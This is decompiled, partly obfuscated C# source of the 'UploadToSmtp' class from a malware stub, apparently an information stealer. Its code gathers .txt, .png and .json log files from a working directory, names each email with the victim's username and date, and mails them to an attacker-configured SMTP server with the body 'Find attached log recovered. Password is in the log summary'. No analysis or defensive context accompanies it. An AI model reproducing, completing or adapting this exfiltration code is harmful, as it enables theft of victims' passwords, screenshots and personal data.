using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000CD RID: 205
	public class UploadToSmtp
	{
		// Token: 0x0600030D RID: 781 RVA: 0x0001CB3C File Offset: 0x0001AD3C
		public async Task<bool> UploadFilesAsync()
		{
			int CoEnableSsl = Convert.ToInt32(UploadToSmtp.Mailenablessl);
			bool EnableSSL = Convert.ToBoolean(CoEnableSsl);
			bool flag;
			try
			{
				using (MailMessage message = new MailMessage())
				{
					message.To.Add(UploadToSmtp.Mailreceiver);
					message.From = new MailAddress(UploadToSmtp.Mailsender);
					message.Subject = UploadToSmtp.Mailsubject;
					message.Body = UploadToSmtp.Mailbody;
					string[] files = (from f in Directory.GetFiles(Paths.InitWorkDir(), "*.*", SearchOption.TopDirectoryOnly)
						where f.EndsWith(".txt", StringComparison.OrdinalIgnoreCase) || f.EndsWith(".png", StringComparison.OrdinalIgnoreCase) || f.EndsWith(".json", StringComparison.OrdinalIgnoreCase)
						select f).ToArray<string>();
					foreach (string file in files)
					{
						string extension = Path.GetExtension(file).ToLower();
						string text = extension;
						string text2 = text;
						string text3 = text2;
						Attachment attachment;
						if (!(text3 == ".txt"))
						{
							if (!(text3 == ".png"))
							{
								if (!(text3 == ".json"))
								{
									attachment = new Attachment(file, "application/octet-stream");
								}
								else
								{
									attachment = new Attachment(file, new ContentType("application/json"));
								}
							}
							else
							{
								attachment = new Attachment(file, new ContentType("image/png"));
							}
						}
						else
						{
							attachment = new Attachment(file, "text/plain");
						}
						text2 = null;
						message.Attachments.Add(attachment);
						extension = null;
						attachment = null;
						file = null;
					}
					string[] array = null;
					using (SmtpClient client = new SmtpClient(UploadToSmtp.Mailserver))
					{
						client.UseDefaultCredentials = false;
						client.Credentials = new NetworkCredential(UploadToSmtp.Mailsender, UploadToSmtp.Mailpassword);
						client.Port = Convert.ToInt32(UploadToSmtp.Mailport);
						client.EnableSsl = EnableSSL;
						client.DeliveryMethod = SmtpDeliveryMethod.Network;
						await client.SendMailAsync(message);
					}
					SmtpClient client = null;
					files = null;
				}
				MailMessage message = null;
				flag = true;
			}
			catch (Exception ex)
			{
				Console.WriteLine("Email sending failed: " + ex.Message);
				flag = false;
			}
			return flag;
		}

		// Token: 0x0600030E RID: 782 RVA: 0x000038B4 File Offset: 0x00001AB4
		public UploadToSmtp()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600030F RID: 783 RVA: 0x0001CB80 File Offset: 0x0001AD80
		static UploadToSmtp()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			UploadToSmtp.Mailsender = Config.SmtpSender;
			UploadToSmtp.Mailreceiver = Config.SmtpReceiver;
			UploadToSmtp.Mailserver = Config.SmtpServer;
			UploadToSmtp.Mailpassword = Config.SmtpPassword;
			UploadToSmtp.Mailport = Config.SmtpPort;
			UploadToSmtp.Mailenablessl = Config.CbEnableSsl;
			UploadToSmtp.Mailsubject = string.Concat(new string[]
			{
				Environment.UserName,
				" - ",
				DateTime.Now.Month.ToString(),
				".",
				DateTime.Now.Day.ToString(),
				".",
				DateTime.Now.Year.ToString()
			});
			UploadToSmtp.Mailbody = "Find attached log recovered. Password is in the log summary";
		}

		// Token: 0x040005F4 RID: 1524
		private static string Mailsender;

		// Token: 0x040005F5 RID: 1525
		private static string Mailreceiver;

		// Token: 0x040005F6 RID: 1526
		private static string Mailserver;

		// Token: 0x040005F7 RID: 1527
		private static string Mailpassword;

		// Token: 0x040005F8 RID: 1528
		private static string Mailport;

		// Token: 0x040005F9 RID: 1529
		private static string Mailenablessl;

		// Token: 0x040005FA RID: 1530
		private static string Mailsubject;

		// Token: 0x040005FB RID: 1531
		private static string Mailbody;
	}
}
